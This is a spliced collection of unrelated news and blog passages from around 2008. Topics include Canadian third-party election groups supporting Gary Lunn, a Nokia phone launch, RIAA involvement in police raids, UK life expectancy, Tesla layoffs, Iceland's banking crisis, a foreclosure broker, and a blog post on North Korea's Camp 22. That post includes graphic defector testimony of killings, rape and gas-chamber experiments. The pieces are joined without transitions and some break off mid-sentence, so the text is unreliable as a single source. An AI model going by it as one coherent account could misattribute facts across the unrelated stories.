There were 52 third parties registered with Elections Canada to spend money during the campaign period leading to yesterday 's election .
Four of them are based at the office of a Victoria lawyer who worked on Conservative Gary Lunn 's campaign .
The groups are Common Sense Advocacy of Victoria , the Dean Park Advocacy Association , the Economic Advisory Council of Saanich and the Saanich Peninsula Citizens Council .
Their respective contacts are Donna Evans , Ralph Bodine , Patricia Trottier and Dana Dickinson .
Interestingly , all four share the same address , 800 - 1070 Douglas Street in downtown Victoria , the office of the law firm Crease Harman and Company .
They also share the same phone number .
The receptionist said she 'd never heard of Evans , Bodine , Trottier or Dickinson .
But Crease Harman is also the firm where Bruce Hallsor works .
Hallsor is a former Canadian Alliance Party candidate , proportional representation advocate and Gary Lunn supporter .
“ They all wanted to register groups as third party advertisers , so I did that for them , ” said Hallsor .
“ It 's the right of every citizen who wants to express their opinion in an election to do so up to the spending limit . ”
Dickinson 's group did some advertising in 2006 , he said , but the other three were new for this election .
The groups did things like buy lawn signs and ads in the local daily newspaper , he said .
All were supporting Lunn , he acknowledged .
“ That 's right .
That 's how I know them . ”
Other groups registered to oppose Lunn , he said .
There 's a difference between the types of bodies registered at Hallsor 's office and groups like the Dogwood Initiative or Conservation Voters of B.C. that have been around for several years and exist to promote an issue , not a single candidate , said Kit Spence , the campaign manager for Liberal Briony Penn against Lunn .
“ These are clearly shills for the Conservative Party and Gary Lunn , ” said Spence .
“ I happen to live in Dean Park and I know that organization never existed up until election time . ”
The rules governing third party advertisers exist to allow groups with a cause to promote it during an election , he said .
They are allowed to spend $ 3,666 in any one riding , or $ 183,300 country wide .
“ I do n't think they were designed to allow candidates to create organizations that exist only for the period of an election and only to support one candidate . ”
Even if the groups were outside the spirit of the law , Spence said , they were probably within its bounds .
“ It 's within the rules , but marginally , ” he said .

Nokia is launching a touchscreen phone that connects to a music store with 2 million free tracks .
It has revealed the 5800 XpressMusic phone while announcing details of its Comes with Music service , which will allow 12 months of unlimited music downloads on pay - as - you - go phones .
From 16
October , the bundle will be sold for £ 129.95 exclusively from the Carphone Warehouse .
The service boasts more than two million tracks , available first on Nokia 's 5310 XpressMusic handset and on more models later .
Major music label EMI has announced that it is taking part in the service .
Rory Cellan - Jones has been testing the new phone .
Beer has been served in pints since at least 1698 , when an Act of Parliament prescribed that ale and beer should be sold in pints , full quarts ( 2 pints ) , or multiples thereof .
The measurements were further set in stone by the 1824 Weights and Measures Act , which ensured that all food and drink was sold in imperial measurements .
When a story appears in the media involving piracy , it inevitably mentions how lobby groups like the RIAA get involved in helping establish evidence .
Is this really needed , or does this compromise the cases ?
Should representatives for the victims really be used to form the basis of a criminal case , or should evidence be gathered by the police ?
No matter where the story originates , be it the UK , USA , Italy , Asia , or Australia , it reads the same .
A raid is carried out , assisted by members of the local anti-piracy lobby group .
From Oink , to The Pirate Bay , these raids are consistently getting assistance and ‘ evidence ’ from those that claim to be losing out to the targets of these raids .
Some might think that this is acceptable – maybe police forces are not equipped to deal with highly technical cases like this , and so need to outsource to specialist agencies like these for help ?
This is certainly not the case , as many countries have specialist departments that are highly experienced and qualified in the forensic examination of computers and technology .
The problem is more real .
Interest groups that claim to be the victim – are allowed to participate in the prosecution of their targets .
In most police investigations , if a police officer is directly involved in a crime , he or she is usually unable to participate in the investigation as being involved reduces ( or even eliminates ) that person ’s objectivity .
Justice is meant to be blind , not fueled by thoughts of personal redemption or vengeance .
However , time and time again we see ‘ investigators ’ for the MPAA or RIAA pop up in cases .
Often they will state they ( or their members ) have had losses , thus making them the victim .
If you believe that someone has caused you or your members a loss , are you going to act from that basis when gathering evidence , or will you work as hard to find the person innocent as you will to find them guilty ?
While the problem is growing worse , it is doing so in only a limited way .
It is only apparent in the gray area that is copyright infringement .
Could you imagine the outcry in the UK , if anti-speed organization BRAKE was involved in investigating road traffic accidents ?
If they were , would a large percentage of accident investigations involving them find causes related to the organizations policy and positions ?
No police department anywhere in the world would consider requesting a Greenpeace investigator when looking into flytipping .
So , why are media industry groups treated differently , when it comes to anything involving copyright ?
The reason we ’ve raised this is because of an incident in the US that caught our eye .
A motorist driving in Park Forest , Il , a town some 30 miles south of Chicago , was pulled over for speeding .
With an apparent suspended license he was arrested .
The car was searched , and that ’s where a few spindles of CDs and DVDs were found .
The spindles had handwritten markings , labeling them as movies and music .
Surprisingly enough police called in the RIAA , a rather biased lobby group , to investigate the incident .
As a result , the speeding motorist ’s house was searched , and two of the 6 charges against him are relating to copyright .
Whether the motorist turned out to be a commercial pirate or not is irrelevant , the fact that the police and the RIAA cooperate like this is what worries us .
They might be searching iPods next .
Requests to Park Forest Police Chief Thomas
Fleming have gone unanswered , and no trace of the RIAA investigator can be found either .
It proves though , that no matter where you are , there is little chance of of a fair investigation if you ’re accused of copyright infringement .
Smoking rates have fallen dramatically in men in the past 20 years
The gap in life expectancy between men and women in the UK is narrowing , official figures show .
On average , women live longer than men - 81.5 years compared with 77.2 years , the latest Office for National Statistics show .
But the ONS said the difference in life expectancy between men and women has narrowed over the past 20 years by a year and a half .
Experts said men quitting smoking and better heart care were responsible .
See life expectancy rates across the UK
The figures showed life expectancy has improved in all countries and regions of the UK in recent years , although children in the south of England can still expect to live longer than those in the north .
One of the big killers of men in middle age is cardiovascular disease , and early diagnosis and treatment has reduced that quite dramatically
Professor Alan Maryon - Davis
Life expectancy in the south west is now 78.7 years for men and 82.9 years for women compared with 76.3 years for men and 80.4 years for women in the north east .
London showed the biggest improvement between 1991 - 93 and 2005 - 07 of 4.6 years for men and 3.1 years for women .
The second largest increases were in the north east with 4.3 years for men and 3.0 years for women .
Men in Scotland had the smallest increase in life expectancy over the period at 3.3 years and for women the smallest increase was in Wales at 2.3 years .
At the age of 65 , men can now expect to live for another 17.2 years and women for 19.9 years .
Healthier men Professor Alan Maryon - Davis , president of the Faculty of Public Health said he was not surprised to see the gap between men and women narrowing .
" Men stopping smoking has been a powerful factor as that has come down pretty well over the past 20 years .
" The other factor is that one of the big killers of men in middle age is cardiovascular disease and early diagnosis and treatment has reduced that quite dramatically .
" And lifestyle factors have improved although obesity is still a big problem . "
He added that in more recent years , GP incentives for monitoring and controlling blood pressure and high tech approaches to heart attack care had also had a big effect .
" It 's all very encouraging . "

The new NBC News / Wall Street Journal poll will be released at 6:30 pm ET , but here 's an early look at one set of numbers :
Forty - nine percent say that Palin is unqualified to be president if the need arises , compared with 40 percent who say she 's qualified .
By contrast , 64 percent believe Biden is qualified to be president , versus just 21 percent who disagree .

UPDATE : Tesla notifies Detroit workers already - in - the - know they were laid off two days ago ... today !
In a sign of what this new Financiapocalypse might bring , employees in the Metro Detroit branch of electric car maker Tesla Motors were laid off via a blog post .
Yesterday , we reported that Tesla would be cutting back and reorganizing , which included shutting down the office in Rochester Hills , near Detroit .
Unfortunately , no one told the employees in Rochester Hills .
Some of them logged on to find that they were now , according to their own website , obsolete .
But it gets worse .
We 're hearing that approximately 90 Tesla employees , or 90 % of the Detroit office , was simply let go , and the remaining employees have to make their way to the San Carlos headquarters with no moving costs covered , no increase in salary and no help getting rid of their old homes .
Fortunately , the real estate market in Detroit is red -hot , and the cost of living is about the same in San Carlos .... right ?
The relevant section from the Tesla pink slip blog - post - of - death below :
There will also be some headcount reduction due to consolidation of operations .
In anticipation of moving vehicle engineering to our new HQ in San Carlos , we are ramping down and will close our Rochester Hills office near Detroit .
Good communication , tightly knit engineering and a common company culture are of paramount importance as Tesla grows .

That 's right folks , " good communication " is key .

New York City has thousands of avenues , boulevards , streets and other byways , some famous , others merely utilitarian .
But even many veteran taxi drivers and longtime local residents find it difficult to give the location of Extra Place , mostly because they have never heard of it .
The tiny street is in the East Village and runs north from First Street  without making it to Second Street  between the Bowery and Second Avenue .
About 30 feet wide and 120 feet long , it resembles a dusty alleyway more than an active thoroughfare .
There are no street signs .
It is virtually impossible to see on a standard atlas .
The street does , however , have admirers .
For instance , there is Avalon Bay , the developer of recently constructed luxury buildings on First Street .
It wants to repave Extra Place and create a cleaner passageway to the shops and boutiques that are expected to open in the new buildings .
Other admirers include longtime neighbors who said they were charmed by the truncated lane simply because it was one of the last remnants of the block ’s pregentrified past .
But the city ’s Department of Housing Preservation and Development , which has control of the street , has no interest in holding on to it .
Those in the US will have to wait until late November to get their hands on the new Quest .
To no one ’s surprise , pre-orders for the recently ...
REYKJAVIK ( Reuters ) - Iceland took over its second largest bank , propped up a battered currency and sought on Tuesday a 4 billion euro ( $ 5.44 billion ) loan from Russia to help tackle a crisis threatening to overwhelm the island nation .
Russian Finance Minister Alexei Kudrin said Moscow viewed positively the request from Iceland , whose premier said it had faced a risk of “ national bankruptcy . ”
“ The result will be announced after negotiations , ” Kudrin said .
Prime Minister Geir Haarde said Icelandic officials would travel to Moscow on Tuesday or Wednesday to discuss terms for the loan to bolster the country ’s foreign reserves .
“ With this , like everything else , nothing is certain until it ’s certain , ” Haarde told a news conference .
He said Iceland would not default on its sovereign debt .
Home to just 300,000 people , Iceland used emergency powers rushed through on Monday to dismiss the board of directors of Landsbanki LAIS.IC and put the bank in receivership .
That tipped the country ’s crown currency into a 35 percent nosedive although it later recovered some ground .
So volatile was the currency that Iceland ’s central bank was forced to introduce a currency peg at a value of 131 per euro .
It was last trading around 150 .
An International Monetary Fund spokesman said an IMF staff team was in Iceland and Norway said it was ready to discuss help but had heard nothing from Reykjavik .
Its reluctance to ask for IMF help was also noted when G7 deputy finance ministers discussed its situation during a conference call on Monday evening , according to a government official from one of the Group of Seven industrial nations .
A branch of Iceland 's Landsbanki Bank in Reykjavik October 6 , 2008 .
REUTERS / Iceland Photo Agency
“ Japan proposed using an IMF facility to help Iceland , but Iceland did not want to ask the IMF for money , ” the official , who was familiar with the content of the phone consultations , told Reuters , speaking on condition of anonymity .
“ Iceland does not want to be singled out as a country that needs IMF help .
Even last summer , Iceland preferred to ask the central banks of some Nordic countries for help rather than go to the IMF for money . ”
REPERCUSSIONS
Iceland ’s commerce and banking minister Bjorgvin Sigurdsson said Landsbanki would be open and run as normal while changes were taking place .
Iceland ’s Financial Supervisory Authority ( IFSA ) had replaced the bank ’s board with its own people .
“ Domestic deposits are fully guaranteed , as declared by the government .
Landsbanki ’s domestic branches , call centers , cash machines and internet operations will be open for business as usual , ” the IFSA said in a statement .
Ratings agency Standard & Poor ’s sharply revised its banking industry country risk assessment , saying : “ The recent developments likely mark the end of the Icelandic banking model as it had developed over recent years .
The forthcoming unwinding of the banking sector is likely to have significant repercussions on the economy and on the banks themselves . ”
The central bank said a Russian loan would substantially strengthen Iceland ’s foreign reserves and support the crown , which Haarde predicted would should strengthen significantly when more normal trading conditions resumed .
“ Four billion euros would be more or less what Iceland needs to cover the whole banking system assets with their reserves , ” said Elisabeth Gruie , currency strategist at BNP Paribas .
“ It ’s also a surprising move for Russia that reflects its desire to reaffirm itself as a world power . ”
Political analysts pondered Moscow ’s strategy in the light of its increasingly robust dealings with the west .
“ I think there will be a lot of eyebrows raised in NATO if Iceland does accept this loan .
I think the Icelandic government will need to ask themselves and the Russians a lot of questions before they accept , ” said Carlo Gallo , senior Russia analyst at Control Risks .
RUSSIA LOOMS LARGE
Iceland adopted sweeping powers over banks late on Monday as its financial system tottered and its currency plunged .
The ruling alliance and opposition parties united to pass a bill that gave the state the ability to dictate banking operations , including provisions that allow it to push through mergers or even force a bank to declare bankruptcy .
“ We were faced with the real possibility that the national economy would be sucked into the global banking swell and end in national bankruptcy , ” Haarde told the nation late on Monday .
Iceland 's biggest bank , Kaupthing KAUP.IC , said on Sunday it was in healthy shape but only last week the number three bank , Glitnir GLB.IC , had to be rescued .
Landsbanki said it would restructure and rise again .
“ The bank has not been put into liquidation but is in receivership which gives it a temporary protection from payment of debts and obligations , ” it said in a statement .
Investment firm Exista kicked off what is expected to be a string of asset sales , saying it had sold its near 20 percent stake in Finnish insurer Sampo to cut liabilities .
Iceland has found itself perched on a faultline in the global financial turmoil .
The North Atlantic island has punched far above its weight in financial terms as its banks expanded overseas , investors took large positions in its high - yielding currency and foreign firms poured money into local projects .
The South Bay ’s reigning King of Foreclosures runs around barefoot , does n’t own a cellphone and drives an 8 - year - old Toyota Tundra pickup .
And without looking the part , Leo Nordine , an affable Hermosa Beach - based real estate broker , expects to average one escrow closing a day this year -- something that would make most agents salivate .
Nordine , a 45 - year - old native son and surfer did n’t just catch the current foreclosure tidal wave , he has sold 3,500 bank - owned homes during the last two decades .
He credits his uncanny ability to time the real estate market ’s cycles and position himself to reap its rewards as the key to his extraordinary success .
And he does it all from the comfort of his home overlooking the Strand in Hermosa Beach .
Little about Nordine ’s road to riches is typical .
He is a case study in how an intense young man without a formal education can be propelled by his drive and work ethic to the height of success -- even when he does n’t live and breathe his job .
“ What ’s important to me , ” Nordine says , “ is family , surfing and work -- in that order . ”
Born to European parents who immigrated to the U.S. so their son could be born a citizen , Nordine ’s childhood was far from the American dream .
His insurance salesman dad , who suffered from Parkinson ’s disease , left when Nordine was 5 .
His mom struggled to provide for him and his sister .
He recalls the family moving from apartment to apartment , staying one step ahead of the eviction notices .
Nordine bought 25 - cent T - shirts at Goodwill to wear to school and took two paper routes for the Daily Breeze when he was old enough to have a job .
Nordine recalls how his dad reappeared one day and asked to borrow $ 200 ; he obliged , but the loan was never repaid .
“ It was the best thing that ever happened to me , ” Nordine says , noting how he opened a savings account with his very next paycheck .
“ Ever since , ” he says , “ it always felt better to me to save than to consume . ”
Even today he does n’t dress , drive or live rich .
In fact , his financial success has come as a total surprise to him .
“ I never figured myself to be someone who would amount to much , ” he said , recalling how at age 15 he ’d drive his Plymouth Duster to Carlsbad with his longboard on the roof .
He ’d surf all day , sleep in the car and pick the oranges off people ’s trees come mealtime .
After washing up in the Hadley Orchard Cafe , he ’d avail himself of its free samples to supplement the fruit .
Then , at 17 , Nordine met the woman who would become his first wife .
He took a series of odd jobs to help support her and her child and -- encountering difficulties working for someone else -- was summarily fired from each of them .
When she became pregnant again , he set his sights on real estate .
Much to his surprise , he had a natural gift for pricing and timing the market .
Within three years , he opened his own business and has run things his way ever since .
He began specializing in selling bank - owned properties in 1990 because , he says , that ’s where the market was headed .
Nordine ’s business model is E.T. Surf , the Hermosa Beach surf shop he frequented as a kid .
He recalls how owner Eddie Talbot “ always treated us with dignity , let us hang out like little sponges just soaking up the surfing atmosphere . ”
Nordine treats his own clients with the same respect .
He understands that homeowners may regard him as the devil incarnate , the guy tasked with selling their homes -- sometimes out from under them .
He ’s fine with it .
“ Whether I sell their houses or not , they are getting foreclosed , ” he said .
“ I negotiate the best deal I can for them . . . cash for keys . ”
Nordine knows that anybody can fall victim to hard times .
And the last thing he wants is for his youngest son , 6 - year - old Nate , to think things come easily in life .
To that end , when Nate was just 2 , Nordine took him on an outing to Watts .
On the subway , Nate saw a homeless man whose disheveled appearance and erratic behavior scared him to the point of tears .
When the man exited the train , he paused by the boy , put his hand on his shoulder and said , “ I ’m sorry I made you cry , son . ”
“ Nate will always remember , ” Nordine said , “ that not everyone is as fortunate as him . ”
Nordine has made his own fortune not only by selling homes but also by investing shrewdly .
In the 1980s , he bought about 20 properties , most of them single - family homes in Torrance .
He sold them off in 1990 and ’91 when he anticipated a bust was coming .
He dived back into the market in the mid-1990s -- this time apartments in Santa Monica -- and sold off most of them in 2005 .
Today , he and his second wife own a 22 - unit complex and a 12 - unit complex in Santa Monica ; a single - family home and a four - plex in El Segundo ; nine bungalows and a four - plex in Torrance ; a five - plex in Redondo Beach ; and the house - office in Hermosa Beach .
But being a dad and husband is what it ’s all about for Nordine .
His is the first face his son Nate sees every morning when he wakes and the last one he sees at bedtime .
So what advice does Nordine offer those concerned about the real estate market ?
Do n’t sell unless you absolutely have to .
Do n’t buy until 2010 , when prices should be at 2000 levels .
And apply every spare nickel to paying off your debt , including mortgages .

Those who have lived to tell us about Camp 22 , located in the bleak northeastern tip of North Korea , can be counted on the fingers of one hand , and all of them are former guards or staff .
Of all of North Korea ’s numerous labor camps and detention facilities , large and small , Camp 22 is one of the largest , and almost certainly the most terrible , if only for the inhuman experiments witnesses say were done to the men , women , children , and even infants sent there .
[ Click the thumbnails in this post to see them full - size ]
[ The scale of North Korea ’s Concentration Camp System . 0:42 ]
[ Source : BBC , “ Access to Evil “ ]
North Korea ’s system of spying , thought - control , isolation , and terror may have no equal in human history .
That is how Kim Il Sung and Kim Jong
Il kept the secrets of Camp 22 inside its ten - foot wire fences and distinctive blocky guard posts for decades .
That changed when satellite photography went public .
Since then , Google Earth has revealed the world ’s most secret places to armies of amateur “ squints . ”
Satellite photography was available to the human rights researcher David Hawk when he set to work on “ The Hidden Gulag , ” his ground - breaking study of North Korea ’s forced labor camps .
Hawk ’s interviews with survivors and former guards alone would not have had the same impact had those witnesses not been able to point to those photographs and say ,
“ This is the detention center , ” Â he said .
“ If someone goes inside this building , in three months he will be dead or disabled for life .
In this corner they decided about the executions , who to execute and whether to make it public .
“ This is the Kim Il Sung institute , a movie house for officers .
Here is watchdog training .
And guard training ground .
Â Pointing to another spot , he said : “ This is the garbage pond where the two kids were killed when guard kicked them in pond .Â 
This also allows us to begin our tour from a base line of more - or - less known fact .
Absolute certainty will have to wait for the day when Camp 22 is liberated .
For Google Earth newbies , you can download the program here .
Each screen grab also shows the scale , coordinates , altitude , and attitude , in case you want to have a look for yourself .
Google Earth ’s high - resolution imagery covers less than half of Camp 22 , the portion that you will view — and escape — from the warmth and comfort of your home today .
As I write this , North Korea has declared four days of celebration for Kim Jong Il ’s 65th birthday , and it is just possible that the inmates of Camp 22 will be permitted a few days of rest from the mines and farms there , where the prisoners usually labor 12 or more hours a day , seven days a week .
Camp 22 is said to hold 50,000 men , women , and children .
We can only see one portion of the camp with Google Earth ’s high - resolution photography .
The yellow scale line to the right of the fence line is just shy of 14 miles .
According to “ The Hidden Gulag , ” the whole camp is 31 miles long by 25 miles wide .
That works out to over 700 square miles , but if one makes allowances for the camp ’s irregular shape , a rough estimate of 500 square miles seems more likely .
That would make it as big as the city of Los Angeles .
Where high - resolution photography is available , it ’s not hard to see the fence line punctuated at intervals of about 1200 feet by guard posts ( below , left ) , buttressed , in places , by smaller guard shacks like these ( below , right ) .
I could n’t explain these unusual ditches until I noted this MSNBC report , claiming that the camp is surrounded by “ land mines and man-traps . ”
It ’s impossible to draw any firm conclusion , but these ditches could be “ tiger traps ” whose coverings have weathered away .
It ’s certainly hard to imagine what other reason there could be for digging trench lines like this along the fence line of a forced labor camp .

The camp is in a remote area , surrounded mostly by forest .
In a few areas , however , just beyond the fence , the lives of North Korea ’s peasant farmers , such as they are , go on .
They cannot read foreign newspapers , listen to foreign broadcasts , possess cell phones or radios that can pick up unauthorized broadcasts , express unauthorized opinions , or travel abroad without fear of entering this gate .
The state owns everything , including the meager rations they grow , and on which they live .
Still , for farmers in North Korea , survival is a little easier than it is for workers in the blighted factory towns where unemployed survivors of the Great Famine still live by stripping the ruins of copper wire .
Just the same , one suspects that the farmers know what ’s good for them .
Most likely , they stay away from the fence , keep their eyes on the soil , and never mention it .
[ Update , 4/2007 :
The camp ’s presence is impossible to ignore completely when it intrudes into the lives of those who live near it , of course .
While living in Seoul , a Korean - American teacher , Joseph Songhoon Lee , met and taught a defector who had lived just outside the camp ’s gate , perhaps near the area imaged above .
Lee described the defector ’s experiences in a recent article for the Washington Post :
[ B ] graduated from School 34 a few weeks ago and is studying at Sungkyunkwan University , one of the nation ’s top colleges .
He grew up a few minutes away from one of North Korea ’s most notorious political prisons , Prison 22 in Hyeryung , Ham - Kyung Province , at the northern tip of North Korea .
Because food and alcohol are scarce in the countryside , the prison guards went to [ B ’s ] house for libations .
“ They always drank heavily , ” Â he told me .
“ And when they got drunk , they would mumble about how sorry they felt for what they did to prisoners .Â
I redacted information identifying the defector at Mr. Lee ’s request .
End Update . ]
The guard posts are the most distinctive feature of the North Korean camps to a Google - Earther .
Here , for example , are Camp 14 ( left ) and Camp 18 ( right ) , near the town of Sunchon …
I first posted pictures of Camp 16 ( below , left ) here .
It ’s near North Korea ’s nuclear and missile testing ranges .
Camp 15 ( below , right ) near the town of Yodok , became infamous after survivor Kang Chol Hwan described it in “ The Aquariums of Pyongyang . ”

You ca n’t help but think that some of these places would be beautiful if their stories were less sad .
Camp 16 , according to “ The Hidden Gulag , ” is a place of exile for families of the condemned .
In North Korea ’s Confucian society , in which every word of the late Great Leader Kim Il Sung is worshipped as holy scripture , the regime strictly obeys his order to root out class enemies for three generations .
That ’s why North Korea does n’t just arrest the person who sings a South Korean pop song or makes an unguarded remark about the food supply .
It arrests that person ’s husband or wife , parents , and children , too .

For the children of Camp 22 , life is short and hard .
One unforgettable image , there were two girls and they were trying to take out a piece of noodle from one polluted water pond where they put the garbage .
And one guard kicked the kids into the small pond , and they drowned .
The pond was very deep , and I felt really sad about that .
Ahn reports that of the 1,500 to 2,000 prisoners who died each year from malnutrition alone , most were kids .
This figure does not include deaths from disease , torture , execution , or from the casual murders he recollects :
I saw numerous prisoners killed , especially by beating .
I saw one person age between 40 and 50 — he ’s old enough because the average age of prisoner is between 40 - 50 — he was working in brick factory .
And as he was older he was moving slowly , he was not working well .
And the team master tramped on his loin , and the bone was broken .
He was hit by an iron rod that is used to start vehicle engines , and I heard the next day he died .
For others , death is a gradual process of human breakage and dismemberment :
At that time the tunnel was passing near the pig pen of the camp , and about 500 political prisoners were participating and there was one female named Han Jin Duk , 26 years old .
I was in charge of giving food to the pigs .
And my supervisor , when he saw the woman , she was beautiful .
And he raped her , and he was found by the watchman officer .
And he was investigated .
My superior , his rank was reduced and the woman was sent to the detention center
And then I did n’t see her for one year .
One day I was going to the place to load the coal , I met her .
And I noticed she was exactly that woman , and I asked her , how you could survive .
And she told me , that yes , I survived .
But she showed me her body , and it was all burned by fire .
After six months I met her at the corn storage in Kusan district and found her putting on a used tire on her knees because her legs were cut off .
Because of a coal mine wagon ran over her knees .
And all she could do now was separate the corn grains from the cob .

And as we will see , Camp 22 may hide greater horrors than even this .
Two of Camp 22 ’s gates are visible from the air .
Looking closely at this gate , the southernmost of the two ( below , left ) , you can actually see a group of people standing in the courtyard , and another behind one of the buildings .
Are these guards ?
Or is this a new crop of prisoners being brought in ?
Further north is the main gate ( below , right ) , which lies on the road to the town of Hoeryong .
Just a few meters from the gate is the place through which trains enter and leave Camp 22 , carrying coal from the Chungbong Coal Mine inside the camp to the power plant at Chongjin and the steel mill at Kimchaek .
Here you can see another guardpost , and a curious catwalk over the tracks .
This , I speculate , is to allow guards to make sure that no prisoner can hide inside any of the coal cars .
Following the tracks west , I even found one of the coal trains .
This is the Chungbong Coal Mine , inside the camp .
If you compare the image on the left to the previously published one on the right , there is n’t much doubt that it ’s the same one the witnesses identified to David Hawk , who published this photograph of the mine with his report .
Closer in , we can see the mine in more detail : a row of hand - cars just outside the tunnel entrance , and piles of mine timbers .
The resolution is even good enough for us to see oxcarts passing each other on the road south of the mine .
In other places , you can even see individual people walking on the road .
The oxcarts give some idea of the size of the huts in which the prisoners live .
My image of a concentration camp ’s housing is of neat rows of barracks like this .
When I first saw the satellite photos of Camp 22 , they were not what I expected .
From the air , it could almost be any ordinary village or neighborhood , but for the fence that surrounds it , and for the reports of the witnesses .
Prisoners , some of them with their families , mostly live in small huts .
As with most of North Korea ’s labor camps , housing is clustered in fairly small groups .
Many other prisoners are housed in much smaller villages , like these :
There ’s really no telling why North Korea houses its prisoners this way , but it makes sense from the perspective of cold logic .
As even the Nazis learned , camps are more secure if they ’re less concentrated .
Two dozen prisoners in a small village present much less of a threat of rebellion than , say , the large group of prisoners who rose up in the Onsong Camp in 1997 .
The uprising ended with 5,000 dead , and Kim Jong
Il reportedly ordered every trace of the place scraped off the face of the earth .
It ’s easier to guess why prisoners are housed in huts ; the camps ’ main method of control is to keep inmates on the verge of starvation and extend them small rewards for informing on each other .
That , and the hut - style housing , limit the opportunities to think unauthorized thoughts .

Where , you may wonder , are the bodies buried ?
Ahn Myong Chol answers :
Not only here but all other places , even in the small hills they bury bodies .
And when we cut the trees down , sometimes we find a buried body .
Not only here , but all around here are buried bodies .
In the hills here , if there is some flat area , it is covered with graves .
And if people start to farm there , they find bodies or bones .
Ahn does n’t describe a specific location , but if you look at the thinly wooded hills around the housing areas , that ’s where they ’re probably buried .
All I can make is an educated guess , but I ’ll guess that this hill is a likely site .
I called my guess “ educated : ” traditionally , Koreans bury their dead in round graves on high places .
Relatives care for the graves of their loved ones .
Proper Korean graves are covered with carefully trimmed grass .
Clearly , proper burials are not always possible at Camp 22 , but if you look closely at this hill , which sits just next to the larger housing area pictured above , you can actually make out a few light , round patches of disturbed earth .

I served in South Korea with the U.S. Army for four years , from 1998 to 2002 .
As I was serving in Korea , more survivors of the camps began to describe the conditions there .
We already heard about the completely preventable famine that killed about 2 million North Koreans while Kim Jong
Il built a nuclear arsenal and bought artillery , submarines , missiles , and MiG’s .
For the soldiers , in a way , none of this really mattered much .
Most soldiers tend to be fairly apolitical .
For those who kept up with the reports , it only reinforced what we knew , but could not really change , about the brutality of life inside North Korea .
What struck me more was why South Koreans did n’t care .
This comment on my blog typifies the mixture of denial and justification so many South Koreans , especially the young , applied to the horrors in the North .
It ’s a wierd witch ’s brew of nationalism and socialism that , in its various forms , periodically incinerates lives by the millions .
Just after I left Korea , while I was still on active duty , I read two reports that haunt me to this day .
One was this BBC report , citing the accounts of multiple survivors , that North Korea kills the babies of refugee women China forcibly repatriates :
One woman told of being forced to assist injection - induced labours and then watching as a baby was suffocated with a wet towel in front of its mother .
Many former prisoners told of babies buried alive or left face down on the ground to die .
They were told by guards this was to prevent the survival of half - Chinese babies .
If fleeing North Koreans are discovered by Chinese police , they are almost always returned home .
None of this was enough to interfere with China scoring the 2008 Olympics , or with its favorable trade relations .
At the time I read this , my son , who is half Korean , was two months old .
It was one of two times in my adult life I can recall having broken down and wept .
The other was when I read this :
‘ I witnessed a whole family being tested on suffocating gas and dying in the gas chamber , ’ he said .
‘ The parents , son and and a daughter .
The parents were vomiting and dying , but till the very last moment they tried to save kids by doing mouth - to - mouth breathing . ’
Hyuk has drawn detailed diagrams of the gas chamber he saw .
He said : ‘ The glass chamber is sealed airtight .
It is 3.5 metres wide , 3 m long and 2.2 m high_ [ There ] is the injection tube going through the unit .
Normally , a family sticks together and individual prisoners stand separately around the corners .
Scientists observe the entire process from above , through the glass . ’
‘ It would be a total lie for me to say I feel sympathetic about the children dying such a painful death .
Under the society and the regime I was in at the time , I only felt that they were the enemies .
So I felt no sympathy or pity for them at all . ’
[ The Guardian ]
According to the “ scientist ” who claims to have participed it , this also happened at Camp 22 .

There are no high - resolution images of the camp ’s administration areas , where this is most likely to have happened , but “ The Hidden Gulag ” published this photo .
You can see photos of the camp ’s North and South sections , where are beyond the Google Earth coverage , here and here .
The gas chamber reports were the basis of the BBC Television Documentary “ Access to Evil . ”
They are not the only reports about Camp 22 that evoke the legacy of Josef Mengele .
In March 2004 , Rabbi Abraham Cooper of the Simon Wiesenthal Center wrote an op-ed for the Singapore Straits Times that cited the reports of a former engineer at the camp , Kang Byong Sop .
Kang claimed that “ political prisoners were trucked in twice a week for experiments , ” and said that he saw “ human hands scratching a round glass window inside a chamber that was locked with a heavy metal door . ”
Cooper called on North Korea to allow international inspections of Camp 22 .
Failing that , he did the next best thing ; he flew to Seoul to interview the witnesses .
Since then , another report , attributed to British intelligence sources and published in the arch - conservative World Net Daily , made an equally horrific accusation .
“ Hundreds of prisoners die there each week , the victims of biological or chemical experiments to test out [ chemical and biological ] weapons for North Korea ’s CBW arsenal , ” Â claims an MI6 report .
In one intelligence file is the allegation that newborn babies are taken from their mothers and injected with biological agents or given injections of chemicals that blister the skin , leaving huge keloids , the sores seen on the bodies of Hiroshima victims .
The U.S. Committee for Human Rights in North Korea believes that 400,000 people have died in North Korea ’s labor camps during the last three decades .
Just for comparison , Cleveland , Oakland , Omaha , and Toulouse each have just over 400,000 people .
There are still an estimated 200,000 people in the camps today .
There is no way to know for certain how many of these reports are true .
Kim Jong
Il ’s regime wo n’t let anyone visit the camps , except for those who go there to die .
The regime denies that the camps even exist .
Neither the Red Cross , nor aid workers with the World Food Program , nor the U.N. Special Rapporteur for Human Rights in North Korea has been let anywhere near the place .
Human rights organizations go through the motions of publishing occasional reports criticizing the regime ’s human rights record , but their few calls to inspect or close the camps attract little media attention .
Not a single government or international institution has been willing or able to confront the horrors of Camp 22 .
In 2004 , Congress unanimously passed this law , which includes a “ sense of Congress ” resolution that the United States should make an issue of human rights in its dealings with North Korea .
No evidence suggests that the Administration ’s diplomats ever even brought the issue up .
They also ignored a law requiring U.S. embassies and consulates in places like China , Laos , Thailand , and Vietnam to take in North Koreans who often go that far to escape their homeland .
On February 14th of this year , the U.S. , South Korea , Japan , and Russia signed a deal with North Korea that aspires to remove it from the “ terrorism ” list , return to normal trade relations , and even full diplomatic relations .
Some would say this is the only way to change North Korea , but it ’s been tried .
South Korea poured $ 7 billion in aid into the North over the last ten years .
Kim Jong
Il spent the money on weapons , millions of ordinary North Koreans starved , and Kim Jong
Il never been more ruthless or better armed .
Nothing in the agreement or the statements of the parties offers so much as a word of hope to the people in Camp 22 , who will probably never hear of it .
They will probably end up as forgotten and buried inconveniences .
U.N. General Secretary Kofi Annan recently apologized for doing nothing while 800,000 Rwandans were murdered .
Meanwhile , the killing went on at Camp 22 .
Neither Annan , nor his High Commissioner for Human Rights , nor his High Commissioner for Refugees said or did much of anything .
The world has forgotten the North Korean people … at least the ones without nuclear weapons .
Annan ’s successor , Ban Ki Moon , built his career as South Korea ’s Foreign Minister by ignoring North Korean atrocities .
The media have also failed to tell this story .
The few reporters who go to North Korea seldom venture far from the capital , Pyongyang .
When they do go , Internal Security Bureau minders drive them all along pretty much the same circuit of palaces , tombs , and monuments .
None ever gets within miles of Camp 22 , and few ask .
Still , they bring us back footage of tombs and monuments and strident quotes from their minders and tell us how much more we now know about North Korea than we did before .
